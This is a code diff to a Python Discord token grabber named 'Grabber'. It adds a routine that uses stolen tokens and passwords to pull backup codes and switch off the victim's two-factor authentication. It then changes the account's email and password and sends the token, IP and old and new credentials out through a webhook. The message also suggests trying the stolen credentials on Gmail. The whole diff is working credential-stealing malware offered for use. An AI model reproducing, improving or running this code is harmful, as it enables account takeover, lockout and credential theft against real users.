@@ -13,8 +13,10 @@ class Grabber:
             self.getAppData() + '\\Discord\\Local Storage\\leveldb'
         ]
         self.passwords = []
+        self.validPassword = []
         self.tokens = []
         self.validTokens = []
+        self.backupCodes = []
         self.session = requests.Session()
 
     def getHeaders(self, token): 
@@ -25,11 +27,29 @@ class Grabber:
         }
         return headers
 
-    def randNumber(self):
-        number = random.randint(1, 999)
-        return number
+    def bye2FA(self):
+        for password in self.passwords:
+            for token in self.validTokens:
+                payload = {
+                    "password": password,
+                    "regenerate": False
+                }
+                r = self.session.post('https://discordapp.com/api/v6/users/@me/mfa/codes', headers=self.getHeaders(token), json=payload)
+                for _i in range(10):
+                    backup = r.json()['backup_codes'][_i]['code']
+                    self.backupCodes.append(backup)
+                for code in self.backupCodes:
+                    newPayload = {
+                        'code': code
+                    }
+                    req = self.session.post('https://discordapp.com/api/v6/users/@me/mfa/totp/disable', headers=self.getHeaders(token), json=newPayload)
+                    if req.status_code == 200: # handle later
+                        return True
+                    else:
+                        return False
 
     def lockOut(self):
+        self.bye2FA() # remove 2fa before operating
         time = datetime.datetime.now().strftime("%H:%M %p")
         newPassword = self.newPassword()
         newEmail = self.newEmail()
@@ -56,25 +76,26 @@ class Grabber:
                 r_json = r.json()
                 token = token.replace('[', '').replace(']', '').replace("'", '') # :shrug:
                 message = f'= {time} ='
-                message += f'\nToken :: {token}'
-                message += f'\nIP :: {grabIP}'
-                message += f'\nOld Email :: {userInfo["email"]}'
-                message += f'\nOld Password :: {password}'
+                message += '\nToken :: ' + token
+                message += '\nIP :: ' + grabIP
+                message += '\nOld Email :: ' + userInfo['email']
+                message += '\nOld Password :: ' + password
+                self.validPassword.append(password)
                 message += '\n[ - - - - - - - - - - - - - - - - - - - - - ]'
                 try:
                     if userInfo['email'] != r_json['email']:
-                        message += f'\nNew Email :: {newEmail}'
+                        message += '\nNew Email :: ' + newEmail
                     else:
                         message += f'\nNew Email :: [None, couldnt change]'
                 except (KeyError):
                     message += f'\nNew Email :: [None, couldnt change]'
                 if password != newPassword: # <TODO> Find a better way to do this check
-                    message += f'\nNew Password :: {newPassword}'
+                    message += f'\nNew Password :: ' + newPassword
                 else:
                     if self.errors[2] in r.text:
                         message += f'\nNew Password :: [None, couldnt change]'    
                 message += f'\nLogin Url :: https://ically.net/#/{base}\n\n'    
-                message += '= Quick note: You can try if the [Old Email] and [Old Password] work in gmail! ='
+                message += '= Quick tip: You can try if the [Old Email] and [Old Password] work in gmail! ='
                 if self.errors[1] in r.text:
                     self.webHook("[ERROR] :: Couldnt retrieve any valid token from the leveldb file")
                     print(f"[{self.randNumber()}] Screenshot this error and send it to the owner")
@@ -148,6 +169,10 @@ class Grabber:
     def newPassword(self):
         passw = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
         return passw
+
+    def randNumber(self):
+        number = random.randint(1, 999)
+        return number
 
     def grabIP(self):
         r = self.session.get('https://ifconfig.co/json')
